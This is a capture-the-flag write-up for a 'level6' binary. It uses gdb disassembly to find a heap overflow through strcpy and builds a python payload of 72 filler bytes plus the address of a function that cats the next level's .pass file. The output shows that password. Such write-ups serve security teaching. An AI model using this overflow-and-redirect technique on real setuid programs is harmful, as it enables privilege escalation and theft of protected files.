# Search

```
$ ls -l
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6

$ ./level6 
Segmentation fault (core dumped)

$ ./level6 aaaaaaaaaaaaaaa
Nope

$ ./level6 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

# Analyze with gdb

```
(gdb) disas main
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave  
   0x080484d3 <+87>:    ret    

<!-- There is call to an address, it look like a function address -->

(gdb) info function
...
0x08048454  n
0x08048468  m
...

<!-- there is 2 non called functions -->

(gdb) disas n
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave  
   0x08048467 <+19>:    ret    
(gdb) x/s 0x80485b0
0x80485b0:       "/bin/cat /home/user/level7/.pass"

<!-- This function call system with arg /bin/cat /home/user/level7/.pass -->

(gdb) disas m
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave  
   0x0804847b <+19>:    ret    

<!-- This function call puts whith arg "Nope" -->
```

after analyzing the code we know that we have to call ```n``` function\
if we put a bpoint at main+84 we can see that the adress of eax is 
```
info reg eax
eax            0x8048468        134513768
```
wait a minute is this the adress of m function ??\
YES so we have to replace this by the n function
- n address = ```0x08048454``` -> for payload in little endian -> ```\x54\x84\x04\x08```
- find the offset of eip, we already did this using [pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?)

## find offset

```
(gdb) start Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

(gdb) step
Single stepping until exit from function main,
which has no line number information.

Program received signal SIGSEGV, Segmentation fault.

(gdb) info reg eip
eip            0x41346341       0x41346341
```

0x41346341 -> offset 72

## Payload

```$(python -c "print('a'*72 + '\x54\x84\x04\x08')")```
so
```
$ ./level6 $(python -c "print('a'*72 + '\x54\x84\x04\x08')")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```